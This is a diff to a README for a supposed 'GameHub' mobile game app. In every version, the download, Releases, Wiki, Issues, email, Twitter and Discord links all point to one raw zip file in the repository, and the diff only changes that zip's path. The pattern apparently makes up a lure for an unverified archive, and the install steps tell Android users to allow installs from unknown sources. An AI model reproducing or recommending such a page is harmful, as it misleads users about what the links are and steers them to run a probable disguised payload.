@@ -6,11 +6,11 @@ Welcome to GameHub! This mobile application helps you explore, search, and manag
 
 ## 📥 Download GameHub
 
-[![Download GameHub](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip%https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip)](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip)
+[![Download GameHub](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip%https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip)](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip)
 
 To get started, you need to download the app. Follow these steps:
 
-1. Click the download button above or visit our [Releases page](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip) to find the latest version.
+1. Click the download button above or visit our [Releases page](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip) to find the latest version.
 2. Locate the file suitable for your device.
 3. Download the file to your computer or mobile device.
 
@@ -42,7 +42,7 @@ GameHub offers a wide range of features designed to enhance your gaming experien
 
 To install GameHub, follow these steps:
 
-1. **Download the app:** Click the link to go to our [Releases page](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip) and download the appropriate file for your device.
+1. **Download the app:** Click the link to go to our [Releases page](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip) and download the appropriate file for your device.
 2. **Install the app:**
    - **For iOS:** Open the downloaded file and follow the prompts to install GameHub on your iPhone or iPad.
    - **For Android:** Open the downloaded APK file and allow installations from unknown sources if prompted. Follow the instructions to complete the installation.
@@ -70,15 +70,15 @@ If you run into issues during installation or usage, consider the following step
 
 For further assistance, please check our support channels:
 
-- **Documentation:** Visit our [GitHub Wiki](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip) for guides and tips.
-- **Report Issues:** If you encounter problems, please report them on our [Issues page](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip).
-- **Contact Us:** You can reach out via email at https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip for any specific inquiries.
+- **Documentation:** Visit our [GitHub Wiki](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip) for guides and tips.
+- **Report Issues:** If you encounter problems, please report them on our [Issues page](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip).
+- **Contact Us:** You can reach out via email at https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip for any specific inquiries.
 
 ## 🚀 Join the Community
 
 Stay connected with fellow gamers and developers. Follow us on social media for updates, tips, and community events.
 
-- **Twitter:** [@GameHubApp](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip)
-- **Discord:** Join our community [here](https://raw.githubusercontent.com/Zak12810/GameHub/main/.bundle/GameHub-v1.2.zip).
+- **Twitter:** [@GameHubApp](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip)
+- **Discord:** Join our community [here](https://raw.githubusercontent.com/Zak12810/GameHub/main/ios/GameHub/Hub-Game-v3.2-beta.1.zip).
 
 Thank you for choosing GameHub. We hope it enhances your gaming experience!
